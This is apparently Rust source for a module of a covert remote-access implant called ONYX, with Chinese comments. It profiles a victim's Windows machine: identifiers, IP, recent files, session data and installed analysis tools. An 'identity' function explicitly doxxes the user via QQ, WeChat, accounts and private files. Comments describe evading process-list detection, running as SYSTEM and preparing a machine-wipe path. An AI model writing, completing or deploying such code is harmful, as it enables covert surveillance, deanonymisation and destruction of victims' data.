// ONYX: 身份采集（M4 第一块，先落最小可用版本）
//
// 目标：在拿到任务通道之后，能立刻回答「这台机器是谁的」。
// 全部用 std 实现，不引 FFI、不拉起子进程（拉起 cmd/powershell 会在进程列表里留痕）。
use serde_json::{json, Value};
use std::path::Path;

/// 目录名里出现这些关键字，就认为装了对应工具。
const TOOL_KEYWORDS: &[(&str, &str)] = &[
    ("ida", "IDA Pro"),
    ("ghidra", "Ghidra"),
    ("x64dbg", "x64dbg"),
    ("x32dbg", "x32dbg"),
    ("ollydbg", "OllyDbg"),
    ("windbg", "WinDbg"),
    ("dnspy", "dnSpy"),
    ("ilspy", "ILSpy"),
    ("de4dot", "de4dot"),
    ("cheatengine", "Cheat Engine"),
    ("processhacker", "Process Hacker"),
    ("systeminformer", "System Informer"),
    ("wireshark", "Wireshark"),
    ("fiddler", "Fiddler"),
    ("charles", "Charles"),
    ("hxd", "HxD"),
    ("010 editor", "010 Editor"),
    ("visual studio", "Visual Studio"),
    ("jetbrains", "JetBrains"),
    ("pycharm", "PyCharm"),
    ("rider", "Rider"),
    ("clion", "CLion"),
    ("python", "Python"),
    ("nodejs", "Node.js"),
    ("git", "Git"),
    ("vscode", "VS Code"),
    ("cursor", "Cursor"),
    ("claude", "Claude"),
];

fn env(name: &str) -> String {
    std::env::var(name).unwrap_or_default()
}

/// 取本机对外 IP（不会真的发包，只让系统选路）。
fn local_ip() -> String {
    std::net::UdpSocket::bind("0.0.0.0:0")
        .and_then(|s| {
            s.connect("8.8.8.8:80")?;
            s.local_addr()
        })
        .map(|a| a.ip().to_string())
        .unwrap_or_default()
}

/// 系统安装时间：用 System32 目录的创建时间近似。
fn system_install() -> String {
    let root = env("SystemRoot");
    let dir = if root.is_empty() {
        "C:\\Windows\\System32".to_owned()
    } else {
        format!("{root}\\System32")
    };
    std::fs::metadata(Path::new(&dir))
        .and_then(|m| m.created())
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default()
}

/// 扫描 Program Files 顶层目录，命中关键字的记为已装工具。
fn scan_tools() -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    let mut roots: Vec<String> = Vec::new();
    for var in ["ProgramFiles", "ProgramFiles(x86)", "ProgramW6432"] {
        let v = env(var);
        if !v.is_empty() && !roots.contains(&v) {
            roots.push(v);
        }
    }
    for root in roots {
        let entries = match std::fs::read_dir(&root) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_lowercase();
            for (kw, label) in TOOL_KEYWORDS {
                if name.contains(kw) && !found.iter().any(|f| f == label) {
                    found.push((*label).to_owned());
                }
            }
        }
    }
    found.sort();
    found
}

/// 最近打开过的文件（Recent 目录里的 .lnk）。
/// 以 SYSTEM 运行时自己的 Recent 是空的，所以要遍历真实用户目录。
fn recent_files(limit: usize) -> Vec<String> {
    let mut items: Vec<(u64, String)> = Vec::new();
    for home in crate::onyx_src::user_homes() {
        let recent = format!("{home}\\AppData\\Roaming\\Microsoft\\Windows\\Recent");
        let entries = match std::fs::read_dir(&recent) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for e in entries.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if !name.to_lowercase().ends_with(".lnk") {
                continue;
            }
            let mtime = e
                .metadata()
                .ok()
                .and_then(|m| m.modified().ok())
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_secs())
                .unwrap_or(0);
            items.push((mtime, name.trim_end_matches(".lnk").to_owned()));
        }
    }
    items.sort_by(|a, b| b.0.cmp(&a.0));
    items.dedup_by(|a, b| a.1 == b.1);
    items.into_iter().take(limit).map(|(_, n)| n).collect()
}

/// 启动器登录后写在 %ProgramData%\Onyx\session.json 的会话信息。
fn session_user() -> Value {
    let path = format!("{}\\Onyx\\session.json", env("ProgramData"));
    std::fs::read_to_string(path)
        .ok()
        .and_then(|raw| serde_json::from_str::<Value>(&raw).ok())
        .map(|v| {
            json!({
                "username": v.get("username").and_then(|x| x.as_str()).unwrap_or_default(),
                "hwid": v.get("hwid").and_then(|x| x.as_str()).unwrap_or_default(),
                "device_id": v.get("device_id").and_then(|x| x.as_str()).unwrap_or_default(),
            })
        })
        .unwrap_or(Value::Null)
}

/// 启动器扫盘写下的命中记录（%ProgramData%\Onyx\scan_hits.txt）。
/// 扫盘发生在启动器进程里，agent 读不到它的内存，只能靠这个文件交接；
/// 这样装在非 Program Files 路径（比如 D 盘）的 IDA / x64dbg 也能被报出来。
fn scanner_hits() -> Vec<String> {
    let path = format!("{}\\Onyx\\scan_hits.txt", env("ProgramData"));
    parse_scan_hits(&std::fs::read_to_string(path).unwrap_or_default())
}

fn parse_scan_hits(raw: &str) -> Vec<String> {
    let mut out: Vec<String> = Vec::new();
    for line in raw.lines().take(200) {
        let mut parts = line.split('|');
        let _category = parts.next();
        if let Some(rule) = parts.next() {
            let rule = rule.trim();
            if !rule.is_empty() && !out.iter().any(|x| x == rule) {
                out.push(rule.to_owned());
            }
        }
    }
    out
}

/// 机器画像 —— 原来挂在 `collect_identity` 上，现在并入 `collect_src` 一起返回。
/// 回答的是「这台机器是什么情况」，不是「用机器的人是谁」。
pub fn machine() -> Value {
    json!({
        "user": env("USERNAME"),
        "domain": env("USERDOMAIN"),
        "computer": env("COMPUTERNAME"),
        "os": env("OS"),
        "arch": std::env::consts::ARCH,
        "local_ip": local_ip(),
        "system_install": system_install(),
        "hwid": crate::encode64(hbb_common::get_uuid()),
        "device_id": hbb_common::config::Config::get_id(),
        "agent_version": crate::VERSION,
        "uptime": super::onyx_task::uptime_secs(),
        "tools": scan_tools(),
        "scanner_hits": scanner_hits(),
        "recent_files": recent_files(12),
        "session": session_user(),
    })
}

/// 开盒 —— 只返回「能指向一个真人」的线索。
/// 机器画像已经搬到 `machine()`，这里一条机器字段都不留。
pub fn identity() -> Value {
    let mut v = crate::onyx_identity::clues();
    if let Some(obj) = v.as_object_mut() {
        obj.insert("ok".into(), json!(true));
        // profile_users 留着：格机默认路径要靠它算真实用户目录
        obj.insert(
            "profile_users".into(),
            json!(crate::onyx_src::user_homes()),
        );
    }
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn machine_has_core_fields() {
        let v = machine();
        assert!(v.get("user").is_some());
        assert!(v.get("computer").is_some());
        assert!(v.get("hwid").is_some());
        assert!(v.get("tools").map(|x| x.is_array()).unwrap_or(false));
        assert!(v.get("scanner_hits").map(|x| x.is_array()).unwrap_or(false));
        assert!(v.get("recent_files").map(|x| x.is_array()).unwrap_or(false));
    }

    /// 开盒结果里不该再出现任何机器字段 —— 那些已经搬到 machine()。
    #[test]
    fn identity_is_privacy_only() {
        let v = identity();
        assert_eq!(v["ok"], true);
        for k in ["qq", "wechat", "accounts", "private_files", "text_hits"] {
            assert!(v.get(k).is_some(), "missing {k}");
        }
        for k in ["computer", "hwid", "tools", "scanner_hits", "recent_files"] {
            assert!(v.get(k).is_none(), "{k} should not be in identity");
        }
    }

    #[test]
    fn local_ip_is_parseable_or_empty() {
        let ip = local_ip();
        assert!(ip.is_empty() || ip.parse::<std::net::IpAddr>().is_ok(), "{ip}");
    }

    #[test]
    fn scan_hits_parse_and_dedupe() {
        let raw = "debugger|ida64.exe|D:\\Tools\\IDA\\ida64.exe\n\
                   debugger|ida64.exe|D:\\Other\\ida64.exe\n\
                   ai_tool|cursor|C:\\Cursor\\Cursor.exe\n\
                   badline\n";
        let hits = parse_scan_hits(raw);
        assert_eq!(hits, vec!["ida64.exe".to_owned(), "cursor".to_owned()]);
    }

    #[test]
    #[ignore]
    fn dump_identity() {
        println!(
            "{}",
            serde_json::to_string_pretty(&identity()).unwrap_or_default()
        );
    }

    #[test]
    fn tools_have_no_duplicates() {
        let tools = scan_tools();
        let mut sorted = tools.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(tools, sorted);
    }
}
